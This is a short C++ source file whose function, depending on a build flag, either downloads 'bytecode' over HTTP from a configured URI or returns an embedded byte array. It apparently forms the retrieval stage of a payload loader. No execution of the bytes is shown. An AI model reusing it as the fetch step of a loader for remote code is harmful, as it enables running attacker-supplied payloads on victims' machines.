#ifdef RETRIEVE_FETCH

#include "../static/vars.hpp"
#include <cpr/cpr.h>
#include <iostream>

std::vector<unsigned char> retrieve_bytecode() {
  cpr::Response r = cpr::Get(cpr::Url{BYTECODE_URI});

  if (r.status_code != 200) {
    throw std::runtime_error("HTTP fetch failed with code " +
                             std::to_string(r.status_code));
  }

  std::cout << "[+] Fetched " << r.text.size() << " bytes\n";

  return std::vector<unsigned char>(r.text.begin(), r.text.end());
}

#elifdef RETRIEVE_LOCAL

#include "../static/bytecode.cpp"
#include <vector>

std::vector<unsigned char> retrieve_bytecode() {
  return std::vector<unsigned char>(eBytecode,
                                    eBytecode + std::size(eBytecode));
}

#endif
